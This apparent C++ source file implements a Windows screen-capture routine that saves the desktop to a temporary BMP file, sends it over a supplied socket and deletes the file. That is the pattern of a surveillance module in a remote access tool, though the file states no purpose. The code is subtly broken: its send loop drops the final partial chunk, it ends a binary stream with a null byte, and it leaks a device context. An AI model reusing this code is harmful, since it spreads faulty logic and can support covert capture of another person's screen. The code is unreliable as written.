#include "screenshot.hpp"
#include <cstdio>
#include <fstream>
#include <vector>
#include <Windows.h>

// Function to save a bitmap to a file
// Arg1: HBITMAP hBitmap - Handle to the bitmap to save
// Arg2: const char* fileName - Name of the file to save the bitmap to
// Return: int - Returns 0 on success, -1 on failure
int ScreenShot_::SaveBitmapToFile(HBITMAP hBitmap, const char* fileName) {
    BITMAP bmp;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
        return -1;
    }

    int width = bmp.bmWidth;
    int height = bmp.bmHeight;

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height; // Negative height for top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

    bmfHeader.bfType = 0x4D42; // "BM"
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    std::ofstream file(fileName, std::ios::binary);
    if (!file) {
        return -1;
    }

    file.write(reinterpret_cast<const char*>(&bmfHeader), sizeof(BITMAPFILEHEADER));
    file.write(reinterpret_cast<const char*>(&bi), sizeof(BITMAPINFOHEADER));

    std::vector<BYTE> pBuffer(dwBmpSize);
    if (!GetDIBits(GetDC(NULL), hBitmap, 0, height, pBuffer.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS)) {
        return -1;
    }

    file.write(reinterpret_cast<const char*>(pBuffer.data()), dwBmpSize);

    file.close();

    return 0;
}

// Function to send a file over a socket
// Arg1: SOCKET clientSocket - The client socket to send the file through
// Arg2: const char* filePath - The path to the file to send
// Return: int - Returns 0 on success, -1 on failure
int ScreenShot_::SendFileOverSocket(SOCKET clientSocket, const char* filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        return -1; // Error opening the file
    }

    std::vector<char> buffer(1024);
    std::streamsize bytesRead;

    while (file.read(buffer.data(), buffer.size())) {
        bytesRead = file.gcount();
        send(clientSocket, buffer.data(), bytesRead, 0);
    }

    // Send a terminating byte
    char endMarker = '\x00';
    send(clientSocket, &endMarker, 1, 0);

    file.close();

    return 0;
}

// Function to capture a screenshot and send it over a socket
// Arg1: SOCKET clientSocket - The client socket to send the screenshot through
// Return: int - Returns 0 on success, -1 on failure
int ScreenShot_::CaptureScreenshot(SOCKET clientSocket) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        return -1; // Error getting screen DC
    }

    int screenWidth = GetDeviceCaps(hdcScreen, HORZRES);
    int screenHeight = GetDeviceCaps(hdcScreen, VERTRES);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    if (SaveBitmapToFile(hBitmap, "screenshot.bmp") == 0) {
        if (SendFileOverSocket(clientSocket, "screenshot.bmp") == 0) {
            if (std::remove("screenshot.bmp") == 0) {
                DeleteObject(hBitmap);
                DeleteDC(hdcMem);
                ReleaseDC(NULL, hdcScreen);
                return 0;
            }
        }
    }

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return -1;
}